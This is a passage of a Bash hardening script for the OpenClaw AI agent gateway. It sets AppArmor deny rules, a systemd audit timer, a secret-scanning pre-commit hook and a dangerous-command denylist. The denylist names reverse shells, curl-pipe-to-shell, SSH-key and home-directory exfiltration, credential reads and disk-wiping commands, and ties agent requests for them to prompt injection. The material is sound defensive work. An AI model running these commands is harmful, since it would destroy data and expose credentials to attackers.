  $OPENCLAW_BIN                               mrix,
  $OPENCLAW_BIN_REAL                          mrix,
  $OC_HOME/.local/share/pnpm/**               mr,
  $OC_HOME/.local/bin/openclaw                mrix,
  /usr/local/bin/openclaw                     mrix,
$SANDBOX_APPARMOR_RULES

  # ---- OpenClaw data directory ----
  $OC_DIR/                                    r,
  owner $OC_DIR/**                            rw,
  owner $OC_ENV_FILE                          r,
  owner $OC_CREDENTIALS/**                    r,
  deny $OC_ENV_FILE                           w,
  deny $OC_CREDENTIALS/**                     w,

  # ---- TLS trust store (for HTTPS API calls) ----
  /etc/ssl/certs/**                           r,
  /etc/ca-certificates/**                     r,
  /usr/share/ca-certificates/**               r,
  /etc/ssl/openssl.cnf                        r,

  # ---- Proc and cgroup (Node.js needs runtime introspection) ----
  /sys/fs/cgroup/**                           r,
  owner /proc/*/fd/                           r,
  owner /proc/*/status                        r,
  owner /proc/*/stat                          r,
  owner /proc/*/cgroup                        r,
  owner /proc/*/maps                          r,
  /proc/sys/kernel/random/boot_id             r,
  /proc/sys/kernel/random/uuid                r,
  /proc/sys/vm/overcommit_memory              r,
  /proc/cpuinfo                               r,
  /proc/meminfo                               r,
  /proc/version                               r,

  # ---- Temporary files ----
  owner /tmp/**                               rw,
  owner /var/tmp/**                           rw,

  # ---- Deny dangerous operations ----
  deny mount,
  deny umount,
  deny ptrace,
  deny pivot_root,

  # ---- Deny access to sensitive system paths ----
  deny /proc/*/mem                            rwklx,
  deny /proc/kcore                            rwklx,
  deny /proc/kmem                             rwklx,
  deny /sys/**                                w,
  deny /boot/**                               rwklx,
  deny /dev/mem                               rwklx,
  deny /dev/kmem                              rwklx,
  deny /dev/port                              rwklx,
  deny /root/**                               rwklx,

  # ---- Deny access to SSH keys and auth material ----
  deny $OC_HOME/.ssh/**                       rwklx,
  deny $OC_HOME/.gnupg/**                     rwklx,
  deny $OC_HOME/.aws/**                       rwklx,
  deny $OC_HOME/.kube/**                      rwklx,
  deny /etc/shadow                            rwklx,
  deny /etc/gshadow                           rwklx,
  deny /etc/sudoers                           rwklx,
  deny /etc/sudoers.d/**                      rwklx,

  # ---- Deny execution from writable paths ----
  deny /tmp/**                                x,
  deny /var/tmp/**                            x,
  deny $OC_WORKSPACE/**                       x,

  # ---- Site-specific additions (never overwritten by this script) ----
  include if exists <local/openclaw-gateway>
}
EOF

        chmod 644 "$APPARMOR_DIR/openclaw-gateway"
        msg "AppArmor profile created: $APPARMOR_DIR/openclaw-gateway"

        # Load the unattached profile if AppArmor is active (flags=(enforce) sets enforce mode)
        # The units name AppArmorProfile=openclaw-gateway without the '-'
        # prefix: with AppArmor enabled they do not start unless it is loaded.
        if command -v apparmor_parser &>/dev/null; then
            if apparmor_parser -r -W "$APPARMOR_DIR/openclaw-gateway" 2>/dev/null; then
                msg "AppArmor profile 'openclaw-gateway' loaded in ENFORCE mode"
                info "$GATEWAY_UNIT and $AUDIT_UNIT are bound to it and fail closed without it"
            else
                warn "Failed to parse AppArmor profile (AppArmor may not be active)"
                warn "Ensure AppArmor is installed and enabled: systemctl enable --now apparmor"
                warn "With AppArmor enabled, $GATEWAY_UNIT and $AUDIT_UNIT will NOT start until"
                warn "the profile loads: apparmor_parser -r /etc/apparmor.d/openclaw-gateway"
            fi
        else
            warn "apparmor_parser not found — profile written but not loaded"
            warn "Install AppArmor: pacman -S apparmor"
            warn "Then load: apparmor_parser -r /etc/apparmor.d/openclaw-gateway"
            warn "With AppArmor enabled, $GATEWAY_UNIT and $AUDIT_UNIT will NOT start until then"
        fi

        info "AppArmor policy summary:"
        info "  ALLOW: Node.js binary, system libs, TLS certs"
        info "  EXEC:  node, env, bash/sh/dash, openclaw and this script's helpers only (ix)"
        info "         Other tools: add rules to /etc/apparmor.d/local/openclaw-gateway"
        info "  ALLOW: Read/write to $OC_DIR/ only"
        info "  ALLOW: Network inet/inet6 stream (WebSocket + HTTPS)"
        info "  DENY:  mount, ptrace, raw network"
        info "  DENY:  /proc/*/mem, /sys/**, /boot/**, /dev/mem"
        info "  DENY:  Other users' home directories, /root/"
        info "  DENY:  SSH keys, GPG keys, AWS/Kube configs"
        info "  DENY:  Execution from /tmp, /var/tmp, workspace"
    else
        warn "AppArmor directory $APPARMOR_DIR does not exist"
        warn "Install AppArmor first: pacman -S apparmor"
        warn "Then run the apparmor hardening script"
        warn "The units already name AppArmorProfile=openclaw-gateway: once AppArmor is"
        warn "enabled they will not start until this script has been re-run"
    fi
else
    info "Step 21: AppArmor not requested (use --with-apparmor to enable)"
fi

echo

# =============================================================================
# PHASE 12: SECURITY AUDIT & WORKSPACE PROTECTION
# =============================================================================

echo -e "${C_BLUE}--- Phase 12: Security Audit & Workspace Protection ---${C_NC}"

# -----------------------------------------------------------------------------
# Step 22: Initialize workspace as git repo
# -----------------------------------------------------------------------------

msg "Step 22: Initializing workspace as git repo for rollback..."

if [[ -d "$OC_WORKSPACE/.git" ]]; then
    info "Workspace is already a git repository"
else
    runuser -u "$OC_USER" -- env HOME="$OC_HOME" git -C "$OC_WORKSPACE" init --quiet
    msg "Initialized git repo in $OC_WORKSPACE"
fi

# Create a .gitignore for the workspace (written by the account, atomically)
oc_write_file 0644 "$OC_WORKSPACE/.gitignore" <<'EOF'
# OpenClaw workspace .gitignore
# Generated by AwesomeArchLinux/hardening/openclaw/openclaw.sh

# Secrets and credentials
.env
.env.*
*.key
*.pem
*.p12
*.pfx
credentials/
secrets/

# Node modules
node_modules/

# IDE and OS
.vscode/
.idea/
.DS_Store
Thumbs.db

# Logs
*.log
logs/

# Build artifacts
dist/
build/
*.tgz
EOF

info "Created $OC_WORKSPACE/.gitignore"

# Initial commit
if runuser -u "$OC_USER" -- env HOME="$OC_HOME" git -C "$OC_WORKSPACE" config user.email "openclaw@localhost" 2>/dev/null && \
   runuser -u "$OC_USER" -- env HOME="$OC_HOME" git -C "$OC_WORKSPACE" config user.name "OpenClaw Hardening" 2>/dev/null && \
   runuser -u "$OC_USER" -- env HOME="$OC_HOME" git -C "$OC_WORKSPACE" add -A 2>/dev/null && \
   runuser -u "$OC_USER" -- env HOME="$OC_HOME" git -C "$OC_WORKSPACE" commit -m "Initial workspace snapshot (post-hardening)" --allow-empty --quiet 2>/dev/null; then
    :
else
    info "Could not create initial git commit (non-fatal)"
fi
msg "Workspace git repo initialized for rollback capability"
info "Use 'git log' in $OC_WORKSPACE to track workspace changes"

# -----------------------------------------------------------------------------
# Step 23: Run openclaw security audit
# -----------------------------------------------------------------------------

msg "Step 23: Running OpenClaw security audit..."

info "Running the installed CLI's configuration and local-state audit..."
AUDIT_SUCCEEDED=true
if ! AUDIT_OUTPUT=$(runuser -u "$OC_USER" -- env \
    HOME="$OC_HOME" \
    OPENCLAW_GATEWAY_TOKEN="$GATEWAY_TOKEN" \
    "$OPENCLAW_BIN" security audit 2>&1); then
    AUDIT_SUCCEEDED=false
fi

if [[ -n "$AUDIT_OUTPUT" ]]; then
    echo "$AUDIT_OUTPUT"

    # Save both successful results and diagnostics from a failed audit.
    AUDIT_FILE="$OC_DIR/security-audit-$(date +%Y%m%d-%H%M%S).log"
    printf '%s\n' "$AUDIT_OUTPUT" | oc_write_file 0600 "$AUDIT_FILE"
    info "Audit results saved to: $AUDIT_FILE"
fi

if [[ "$AUDIT_SUCCEEDED" == true ]]; then
    if [[ -n "$AUDIT_OUTPUT" ]]; then
        msg "Security audit completed"
    else
        warn "Security audit produced no output"
    fi
else
    warn "OpenClaw security audit failed; review the diagnostics above before starting the gateway"
fi

# -----------------------------------------------------------------------------
# Step 24: Create security audit systemd timer
# -----------------------------------------------------------------------------

msg "Step 24: Creating weekly security audit systemd timer..."

# Audit script: root-owned and outside the account's home. The job reads files
# the gateway can write (openclaw.json, plugins), so it runs as $OC_USER under
# the same sandbox drop-in as the gateway and never loads $OC_ENV_FILE as a
# whole: only OPENCLAW_GATEWAY_TOKEN is extracted, as data, by the launcher.
cat > "$ROOT_TMP/openclaw-security-audit" <<'AUDIT_SCRIPT_EOF'
#!/usr/bin/bash
# =============================================================================
# Automated OpenClaw security audit
# Generated by AwesomeArchLinux/hardening/openclaw/openclaw.sh
#
# Usage: openclaw-security-audit OC_DIR OPENCLAW_BIN
#
# Runs weekly via the root-owned system timer openclaw-audit-<user>.timer, as
# the OpenClaw service account and inside the same sandbox as the gateway.
# Results are logged and old logs are rotated.
# =============================================================================

set -euo pipefail
umask 077

if [[ $# -ne 2 ]]; then
    printf 'Usage: %s OC_DIR OPENCLAW_BIN\n' "${0##*/}" >&2
    exit 64
fi
if (( EUID == 0 )); then
    printf '%s: refusing to run the OpenClaw CLI as root\n' "${0##*/}" >&2
    exit 77
fi

OC_DIR=$1
OPENCLAW_BIN=$2
AUDIT_LOG_DIR="$OC_DIR/audit-logs"
printf -v AUDIT_STAMP '%(%Y%m%d-%H%M%S)T' -1
AUDIT_LOG="$AUDIT_LOG_DIR/security-audit-$AUDIT_STAMP.log"

mkdir -p -- "$AUDIT_LOG_DIR"

printf '=== OpenClaw Security Audit: %(%c)T ===\n' -1 >> "$AUDIT_LOG"
echo "" >> "$AUDIT_LOG"

if [[ -x "$OPENCLAW_BIN" ]]; then
    audit_status=0
    "$OPENCLAW_BIN" security audit --deep >> "$AUDIT_LOG" 2>&1 || audit_status=1
    echo "" >> "$AUDIT_LOG"
    "$OPENCLAW_BIN" doctor >> "$AUDIT_LOG" 2>&1 || audit_status=1
else
    echo "ERROR: openclaw CLI not found at $OPENCLAW_BIN" >> "$AUDIT_LOG"
    audit_status=1
fi

echo "" >> "$AUDIT_LOG"
echo "=== Audit complete ===" >> "$AUDIT_LOG"

# Rotate: keep last 12 audit logs (12 weeks = ~3 months). The timestamped
# names sort chronologically, so the oldest logs come first in the glob.
LC_COLLATE=C
shopt -s nullglob
audit_logs=("$AUDIT_LOG_DIR"/security-audit-*.log)
if (( ${#audit_logs[@]} > 12 )); then
    rm -f -- "${audit_logs[@]:0:${#audit_logs[@]}-12}" || true
fi
exit "$audit_status"
AUDIT_SCRIPT_EOF
install -o root -g root -m 0755 "$ROOT_TMP/openclaw-security-audit" "$AUDIT_SCRIPT"

# Root-controlled environment for the audit in sandbox mode (the account's
# .env is not loaded, so the Docker endpoint is named here).
AUDIT_UNIT_ENVIRONMENT=""
if [[ "$WITH_SANDBOX" == true ]]; then
    AUDIT_UNIT_ENVIRONMENT="Environment=DOCKER_HOST=unix://$SANDBOX_DOCKER_SOCKET OPENCLAW_DOCKER_SOCKET=$SANDBOX_DOCKER_SOCKET"
fi

# Audit service (root-owned system unit, runs as $OC_USER)
cat > "$SYSTEMD_SYSTEM_DIR/$AUDIT_UNIT" <<EOF
# Weekly OpenClaw security audit service ($OC_USER)
# Generated by AwesomeArchLinux/hardening/openclaw/openclaw.sh
#
# Sandboxed by $AUDIT_UNIT.d/hardening.conf (identical to the gateway's).

[Unit]
Description=OpenClaw Weekly Security Audit for $OC_USER
After=$AUDIT_UNIT_AFTER

[Service]
Type=oneshot
User=$OC_USER
Group=$OC_GROUP
WorkingDirectory=$OC_HOME
UMask=0077
$AUDIT_UNIT_ENVIRONMENT
# No EnvironmentFile=: only OPENCLAW_GATEWAY_TOKEN is taken from the
# account-writable $OC_ENV_FILE, as data, by the root-owned launcher.
ExecStart=$OC_ENV_LAUNCHER --only OPENCLAW_GATEWAY_TOKEN $OC_ENV_FILE $AUDIT_SCRIPT $OC_DIR $OPENCLAW_BIN
EOF

# Audit timer (root-owned system unit)
cat > "$SYSTEMD_SYSTEM_DIR/$AUDIT_TIMER" <<EOF
# Weekly OpenClaw security audit timer ($OC_USER)
# Generated by AwesomeArchLinux/hardening/openclaw/openclaw.sh

[Unit]
Description=Weekly OpenClaw Security Audit Timer for $OC_USER

[Timer]
OnCalendar=weekly
RandomizedDelaySec=3600
Persistent=true

[Install]
WantedBy=timers.target
EOF

chown root:root \
    "$SYSTEMD_SYSTEM_DIR/$AUDIT_UNIT" \
    "$SYSTEMD_SYSTEM_DIR/$AUDIT_TIMER"
chmod 644 \
    "$SYSTEMD_SYSTEM_DIR/$AUDIT_UNIT" \
    "$SYSTEMD_SYSTEM_DIR/$AUDIT_TIMER"

# Same sandbox as the gateway (drop-in generated in Step 19)
install -d -o root -g root -m 0755 "$AUDIT_DROPIN_DIR"
install -o root -g root -m 0644 "$HARDENING_CONF" "$AUDIT_DROPIN_DIR/hardening.conf"

# Enable the timer
if systemctl daemon-reload && \
   systemctl enable "$AUDIT_TIMER" && \
   systemctl start "$AUDIT_TIMER"; then
    msg "Enabled and started $AUDIT_TIMER"
else
    warn "Could not enable the audit timer"
    warn "Run manually: systemctl enable --now $AUDIT_TIMER"
fi

msg "Weekly security audit timer created"
info "Service: $SYSTEMD_SYSTEM_DIR/$AUDIT_UNIT"
info "Sandbox: $AUDIT_DROPIN_DIR/hardening.conf"
info "Timer:   $SYSTEMD_SYSTEM_DIR/$AUDIT_TIMER"
info "Script:  $AUDIT_SCRIPT"

echo

# =============================================================================
# PHASE 13: DANGEROUS COMMAND DENYLIST
# =============================================================================

echo -e "${C_BLUE}--- Phase 13: Dangerous Command Denylist ---${C_NC}"

# -----------------------------------------------------------------------------
# Step 25: Create exec denylist documentation
# -----------------------------------------------------------------------------

msg "Step 25: Documenting dangerous commands that must NEVER be allowlisted..."

DENYLIST_FILE="$OC_DIR/EXEC_DENYLIST.md"

# The timestamp is filled in on the way to the account-side writer; root never
# opens or edits the file inside $OC_DIR.
sed "s/TIMESTAMP_PLACEHOLDER/$(date -u +%Y-%m-%dT%H:%M:%SZ)/" <<'DENYLIST_EOF' | oc_write_file 644 "$DENYLIST_FILE"
# OpenClaw Exec Denylist — Commands That Must NEVER Be Allowlisted

> Generated by AwesomeArchLinux/hardening/openclaw/openclaw.sh
> Last updated: TIMESTAMP_PLACEHOLDER
>
> These commands represent the highest-risk operations that an AI agent
> should NEVER be permitted to execute, even in elevated mode.
> If the AI requests any of these, it may be the result of prompt injection.

## Destructive Commands (Data Loss / System Damage)

| Command | Risk |
|---------|------|
| `rm -rf /` | Recursive delete of entire filesystem |
| `rm -rf ~` | Recursive delete of user home directory |
| `rm -rf *` | Recursive delete of current directory contents |
| `mkfs.*` | Format filesystem (irreversible data loss) |
| `dd if=/dev/zero of=/dev/sd*` | Overwrite disk with zeros |
| `dd if=/dev/urandom of=/dev/sd*` | Overwrite disk with random data |
| `:(){ :|:& };:` | Fork bomb (system resource exhaustion) |
| `> /dev/sda` | Overwrite boot sector |
| `shred /dev/sd*` | Cryptographic disk wiping |
| `wipefs -a /dev/sd*` | Erase filesystem signatures |
| `chmod -R 000 /` | Remove all permissions recursively |
| `chown -R nobody:nobody /` | Transfer ownership to nobody recursively |

## Data Exfiltration Commands

| Command | Risk |
|---------|------|
| `curl <url> \| sh` | Download and execute arbitrary code |
| `curl <url> \| bash` | Download and execute arbitrary code |
| `wget <url> -O- \| sh` | Download and execute arbitrary code |
| `scp ~/.ssh/* remote:` | Exfiltrate SSH keys |
| `tar czf - /home \| curl -X POST -d @- <url>` | Archive and exfiltrate home directory |
| `nc -e /bin/bash <ip> <port>` | Reverse shell |
| `bash -i >& /dev/tcp/<ip>/<port> 0>&1` | Reverse shell via bash |
| `python -c 'import socket...'` | Python reverse shell |
| `cat /etc/passwd \| curl -d @- <url>` | Exfiltrate system users |
| `rsync -a / remote:/stolen/` | Mirror entire filesystem to remote |

## Credential Exposure Commands

| Command | Risk |
|---------|------|
| `cat ~/.ssh/id_*` | Display SSH private keys |
| `cat ~/.ssh/authorized_keys` | Display authorized SSH keys |
| `cat ~/.gnupg/private-keys*` | Display GPG private keys |
| `cat ~/.aws/credentials` | Display AWS access keys |
| `cat ~/.kube/config` | Display Kubernetes credentials |
| `cat /etc/shadow` | Display password hashes |
| `printenv` | Display all environment variables (API keys) |
| `env` | Display all environment variables |
| `history` | Display command history (may contain secrets) |
| `cat ~/.bash_history` | Display bash command history |
| `cat ~/.openclaw/.env` | Display OpenClaw API keys |
| `cat ~/.openclaw/credentials/*` | Display stored credentials |

## Git Footguns (Irreversible Repository Damage)

| Command | Risk |
|---------|------|
| `git push --force` | Overwrite remote history (data loss for team) |
| `git push --force-with-lease origin main` | Force push to main branch |
| `git reset --hard` | Discard all uncommitted changes |
| `git clean -fdx` | Delete all untracked files and directories |
| `git checkout .` | Discard all working tree changes |
| `git rebase -i` (on shared branches) | Rewrite shared history |
| `git filter-branch` | Rewrite entire repository history |

## System Modification Commands

| Command | Risk |
|---------|------|
| `systemctl stop *` | Stop arbitrary system services |
| `systemctl disable *` | Disable arbitrary system services |
| `iptables -F` | Flush all firewall rules |
| `nft flush ruleset` | Flush all nftables rules |
| `passwd` | Change user passwords |
| `useradd` / `userdel` | Create or delete system users |
| `visudo` | Modify sudoers file |
| `crontab -e` | Modify scheduled tasks |
| `at` | Schedule one-time tasks |

## Package Manager Commands (Supply Chain Risk)

| Command | Risk |
|---------|------|
| `npm install <arbitrary-package>` | Install potentially malicious package |
| `pip install <arbitrary-package>` | Install potentially malicious package |
| `pacman -S <arbitrary-package>` | Install system package |
| `curl <url> \| npm install` | Install package from untrusted source |
| `pnpm add <arbitrary-package>` | Install potentially malicious package |

## Incident Response

If the AI agent requests any of these commands:

1. **DENY the request immediately**
2. **Check for prompt injection**: Review the conversation for suspicious user messages
3. **Review session logs**: `~/.openclaw/agents/*/sessions/`
4. **Revoke the pairing**: Remove the contact's pairing in OpenClaw settings
5. **Rotate credentials**: Change API keys in `~/.openclaw/.env`
6. **Run security audit**: `openclaw security audit --deep`
DENYLIST_EOF

msg "Exec denylist documentation written: $DENYLIST_FILE"

# Print a summary to stdout
echo
warn "The following command categories must NEVER be allowlisted in OpenClaw:"
warn "  - Destructive:   rm -rf, mkfs.*, dd if=/dev/zero, fork bombs"
warn "  - Exfiltration:  curl|sh, wget|bash, scp ~/.ssh/*, reverse shells"
warn "  - Credentials:   cat ~/.ssh/id_*, printenv, history, cat ~/.aws/*"
warn "  - Git footguns:  git push --force, git reset --hard, git clean -fdx"
warn "  - System:        systemctl stop, iptables -F, passwd, useradd"
warn "  - Packages:      npm install <arbitrary>, pip install <arbitrary>"
warn "  Full list: $DENYLIST_FILE"

echo

# =============================================================================
# PHASE 14: SECRET SCANNING
# =============================================================================

echo -e "${C_BLUE}--- Phase 14: Secret Scanning ---${C_NC}"

# -----------------------------------------------------------------------------
# Step 26: Install pure-Bash secret-scanning pre-commit hook (optional gitleaks)
# -----------------------------------------------------------------------------

msg "Step 26: Configuring staged-file secret scanning hook..."

if command -v gitleaks &>/dev/null; then
    info "Detected gitleaks ($(gitleaks version 2>/dev/null || echo 'installed')) — hook will run gitleaks + Bash pattern checks"
else
    info "Optional deep scanner available via pacman: pacman -S gitleaks"
fi

HOOKS_DIR="$OC_WORKSPACE/.git/hooks"
oc_mkdir 0755 "$HOOKS_DIR"

oc_write_file 0755 "$HOOKS_DIR/pre-commit" <<'PRECOMMIT_EOF'
#!/usr/bin/env bash
# =============================================================================
# Pre-commit hook: pure-Bash staged secret scanner (+ optional gitleaks)
# Generated by AwesomeArchLinux/hardening/openclaw/openclaw.sh
# =============================================================================

set -euo pipefail

# 1. If gitleaks is installed on the host, run it against staged changes first.
if command -v gitleaks &>/dev/null; then
    if ! gitleaks protect --staged --no-banner --redact; then
        printf '[!] gitleaks blocked commit: potential secret in staged changes.\n' >&2
        exit 1
    fi
fi

# 2. Block commits of credential files by filename.
blocked_files=$(git diff --cached --name-only --diff-filter=ACMR | \
    grep -E '(^|/)(\.env(\..+)?|.*\.(pem|key|p12|pfx))$' || true)
if [[ -n "$blocked_files" ]]; then
    printf '[!] Blocked commit of sensitive credential file(s):\n%s\n' "$blocked_files" >&2
    exit 1
fi

# 3. Scan added lines in git diff --cached for API keys, tokens, and private keys.
SECRET_REGEX='(sk-ant-[A-Za-z0-9_-]{20,}|sk-(proj-|live-|test-)?[A-Za-z0-9_-]{20,}|gh[pousr]_[A-Za-z0-9]{36,}|github_pat_[A-Za-z0-9_]{22,}|glpat-[A-Za-z0-9_-]{20,}|xox[baprs]-[A-Za-z0-9-]{10,}|AKIA[0-9A-Z]{16}|AIza[0-9A-Za-z_-]{35}|-----BEGIN ([A-Z0-9 ]+ )?PRIVATE KEY-----|OPENCLAW_GATEWAY_TOKEN=[0-9a-fA-F]{32,})'

if git diff --cached -U0 --diff-filter=ACMR | awk -v pat="$SECRET_REGEX" '
    /^\+\+\+ b\// { file = substr($0, 7); next }
    /^\+[^+]/ {
        line = substr($0, 2)
        if (line ~ /REPLACE_WITH_YOUR_[A-Z0-9_]+/) next
        if (line ~ pat) {
            printf "[!] Potential secret pattern matched in staged file: %s\n", file > "/dev/stderr"
            found = 1
        }
    }
    END { exit (found ? 0 : 1) }
'; then
    printf '    Remove the secret and store credentials in ~/.openclaw/.env instead.\n' >&2
    exit 1
fi
PRECOMMIT_EOF

msg "Pure-Bash secret-scanning pre-commit hook installed: $HOOKS_DIR/pre-commit"

echo

# =============================================================================
# PHASE 15: SUMMARY
# =============================================================================

echo -e "${C_BLUE}--- Phase 15: Security Summary ---${C_NC}"

# -----------------------------------------------------------------------------
# Step 27: Print comprehensive security summary
# -----------------------------------------------------------------------------

echo
echo -e "${C_GREEN}========================================================================${C_NC}"
echo -e "${C_GREEN}    OpenClaw Security Hardening Complete!${C_NC}"
echo -e "${C_GREEN}========================================================================${C_NC}"
echo

echo -e "${C_BLUE}Configuration:${C_NC}"
echo "  User:                $OC_USER"
echo "  OpenClaw home:       $OC_DIR"
echo "  Config file:         $OC_CONFIG"
echo "  Environment file:    $OC_ENV_FILE"
echo "  Workspace:           $OC_WORKSPACE"
echo "  Gateway port:        $OC_PORT"
echo "  Gateway bind:        loopback (127.0.0.1 only)"
echo "  Docker sandbox:      $WITH_SANDBOX"
echo "  nftables firewall:   $WITH_FIREWALL"
echo "  AppArmor profile:    $WITH_APPARMOR"
echo

echo -e "${C_BLUE}Generated Files:${C_NC}"
echo "  Config:              $OC_CONFIG"
echo "  Environment:         $OC_ENV_FILE"
echo "  systemd service:     $SYSTEMD_SYSTEM_DIR/$GATEWAY_UNIT (root-owned, User=$OC_USER)"
echo "  systemd hardening:   $DROPIN_DIR/hardening.conf"
echo "  Audit service:       $SYSTEMD_SYSTEM_DIR/$AUDIT_UNIT"
echo "  Audit hardening:     $AUDIT_DROPIN_DIR/hardening.conf"
echo "  Audit timer:         $SYSTEMD_SYSTEM_DIR/$AUDIT_TIMER"
echo "  Audit script:        $AUDIT_SCRIPT"
echo "  Env launcher:        $OC_ENV_LAUNCHER"
echo "  Log rotation:        $LOGROTATE_CONF"
echo "  Exec denylist:       $DENYLIST_FILE"
if [[ "$WITH_FIREWALL" == true ]]; then
echo "  nftables rules:      /etc/nftables.d/openclaw.conf"
fi
if [[ "$WITH_APPARMOR" == true ]]; then
echo "  AppArmor profile:    /etc/apparmor.d/openclaw-gateway"
fi
echo "  Hardening log:       $LOGFILE"
echo

echo -e "${C_BLUE}Hardening Applied (27 Steps):${C_NC}"
echo "  Phase 1:  System Prerequisites"
echo "    [1]  Node.js version verified (>= 22.12.0)"
echo "    [2]  Dedicated non-root user verified: $OC_USER"
echo "  Phase 2:  Gateway Hardening"
echo "    [3]  256-bit authentication token generated"
echo "    [4]  Hardened openclaw.json (loopback, auth, no tailscale)"
echo "  Phase 3:  Channel & DM Policy"
echo "    [5]  Channel placeholders omitted; pairing defaults retained"
echo "  Phase 4:  Tool & Execution Security"
echo "    [6]  Tool profile: messaging (minimal)"
echo "    [7]  Exec/process/apply_patch/browser denied; empty safe-bin list"
echo "    [8]  Elevated mode: DISABLED"
echo "    [9]  Web tools: search+fetch enabled, browser DISABLED"
echo "    [10] Cross-context messaging: BLOCKED"
echo "  Phase 5:  Sandbox"
if [[ "$WITH_SANDBOX" == true ]]; then
echo "    [11] Docker sandbox: ALL mode, no-net, ro-root, 512MB, 0.5 CPU"
else
echo "    [11] Docker sandbox: not configured (use --with-sandbox)"
fi
echo "  Phase 6:  Plugin & Skill Security"
echo "    [12] Plugins: deny-by-default, empty allowlist"
echo "    [13] Hooks: DISABLED (anti prompt injection)"
echo "  Phase 7:  Logging & Redaction"
echo "    [14] Logging: info level, sensitive data redacted"
echo "    [15] Log rotation: daily, 14-day retention"
echo "  Phase 8:  File Permissions"
echo "    [16] Permissions: 700 dirs, 600 configs/credentials"
echo "    [17] Secure env file with API key placeholders"
echo "  Phase 9:  systemd Hardening"
echo "    [18] System service (root-owned, runs as $OC_USER): $GATEWAY_UNIT"
if [[ "$LEGACY_UNITS_MIGRATED" == true ]]; then
echo "         Legacy user-level units retired (details in the Step 18 output above)"
fi
echo "    [19] Drop-in: ProtectSystem=strict, NoNewPrivileges, syscall filter"
echo "  Phase 10: Firewall"
if [[ "$WITH_FIREWALL" == true ]]; then
echo "    [20] nftables: loopback-only inbound, rate-limited logging"
else
echo "    [20] nftables: not configured (use --with-firewall)"
fi
echo "  Phase 11: AppArmor"
if [[ "$WITH_APPARMOR" == true ]]; then
echo "    [21] AppArmor: enforce mode, deny ptrace/mount/raw"
else
echo "    [21] AppArmor: not configured (use --with-apparmor)"
fi
echo "  Phase 12: Audit & Workspace"
echo "    [22] Workspace: git-initialized for rollback"
echo "    [23] Security audit: executed (if CLI available)"
echo "    [24] Audit timer: weekly automated scan"
echo "  Phase 13: Denylist"
echo "    [25] Dangerous command denylist documented"
echo "  Phase 14: Secret Scanning"
echo "    [26] Pure-Bash git pre-commit secret scanner (+ optional gitleaks)"
echo

echo -e "${C_BLUE}systemd Hardening Summary:${C_NC}"
echo "  - Root-owned system units; User=$OC_USER, Group=$OC_GROUP (gateway and audit job)"
echo "  - $OC_ENV_FILE loaded by a root-owned launcher as $OC_USER (no EnvironmentFile=)"
echo "  - ProtectSystem=strict (read-only /usr, /boot, /etc)"
echo "  - ProtectHome=read-only (needs read access to ~/.openclaw)"
echo "  - ReadWritePaths=$OC_DIR only"
echo "  - $RUNTIME_DIR_RESTRICTION (user manager unreachable)"
if [[ "$WITH_APPARMOR" == true ]]; then
echo "  - $APPARMOR_DIRECTIVE (fails closed if the profile is not loaded)"
fi
echo "  - PrivateTmp=yes, PrivateDevices=yes"
echo "  - NoNewPrivileges=yes, LockPersonality=yes"
echo "  - RestrictSUIDSGID=yes, CapabilityBoundingSet= (empty)"
echo "  - ProtectKernelTunables/Modules/Logs/ControlGroups=yes"
if [[ "$WITH_SANDBOX" == true ]]; then
echo "  - RestrictNamespaces=~cgroup ipc (allow Docker namespaces)"
else
echo "  - RestrictNamespaces=yes (all restricted)"
fi
echo "  - RestrictRealtime=yes"
echo "  - SystemCallFilter=@system-service @network-io (EPERM)"
echo "  - SystemCallFilter deny: @mount @reboot @swap @clock @cpu-emulation @debug @obsolete @raw-io @privileged"
echo "  - SystemCallArchitectures=native"
echo "  - MemoryDenyWriteExecute=no (V8 JIT requires W+X pages)"
echo "  - RestrictAddressFamilies=AF_INET AF_INET6 AF_UNIX AF_NETLINK (outbound HTTPS permitted)"
echo "  - ProtectProc=invisible (pid-only /proc subset not used: Node.js needs cpuinfo/meminfo)"
echo "  - ProtectHostname=yes"
if [[ "$WITH_SANDBOX" == true ]]; then
echo
echo -e "${C_YELLOW}  NOTE: with --with-sandbox the gateway can reach the rootless Docker daemon${C_NC}"
echo -e "${C_YELLOW}  ($SANDBOX_DOCKER_SOCKET). That daemon runs outside this sandbox as $OC_USER;${C_NC}"
echo -e "${C_YELLOW}  anything able to use the socket can start containers with host bind mounts.${C_NC}"
fi
echo

echo -e "${C_YELLOW}IMPORTANT — Verification Commands:${C_NC}"
echo "  # Check OpenClaw health"
echo "  su - $OC_USER -c 'openclaw doctor'"
echo ""
echo "  # Run deep security audit"
echo "  su - $OC_USER -c 'openclaw security audit --deep'"
echo ""
echo "  # Start the gateway service (system unit, as root)"
echo "  systemctl start $GATEWAY_UNIT"
echo ""
echo "  # Check service status"
echo "  systemctl status $GATEWAY_UNIT"
echo ""
echo "  # View gateway logs"
echo "  systemctl status $GATEWAY_UNIT --no-pager"
echo "  journalctl -u $GATEWAY_UNIT -f"
echo ""
echo "  # Review the sandbox systemd actually applies"
echo "  systemd-analyze security $GATEWAY_UNIT"
echo ""
echo "  # Check audit timer and the last audit run"
echo "  systemctl list-timers $AUDIT_TIMER"
echo "  journalctl -u $AUDIT_UNIT -n 20 --no-pager"
echo ""
echo "  # Verify AppArmor (if enabled)"
echo "  aa-status 2>/dev/null | grep openclaw"
echo ""
echo "  # Verify nftables (if enabled)"
echo "  nft list table inet openclaw 2>/dev/null"
echo ""
echo "  # Verify file permissions"
echo "  stat -c '%a %U:%G %n' $OC_CONFIG $OC_ENV_FILE $OC_DIR"
echo ""
echo "  # Test workspace pre-commit secret scanner"
echo "  $OC_WORKSPACE/.git/hooks/pre-commit"
echo

echo -e "${C_YELLOW}IMPORTANT — Next Steps:${C_NC}"
echo "  1. Edit $OC_ENV_FILE and add your actual API keys:"
echo "     ANTHROPIC_API_KEY=sk-ant-..."
echo "     OPENAI_API_KEY=sk-..."
echo ""
echo "  2. Approve pairing codes for trusted contacts:"
echo "     When a user DMs the bot for the first time, a pairing code"
echo "     is displayed. Approve it via the OpenClaw control UI or CLI:"
echo "     openclaw pairing approve <code>"
echo ""
echo "  3. Keep exec denied unless a reviewed workflow requires it:"
echo "     openclaw approvals get                         # Show approvals"
echo "     openclaw approvals allowlist add /usr/bin/cmd # Add exact binary"
echo "     openclaw approvals allowlist remove /usr/bin/cmd"
echo "     NEVER approve destructive commands (see $DENYLIST_FILE)"
echo ""
echo "  4. Start the gateway (root-owned system unit; it runs as $OC_USER):"
echo "     systemctl enable --now $GATEWAY_UNIT"
if [[ -n "$LEGACY_GATEWAY_STATE" ]]; then
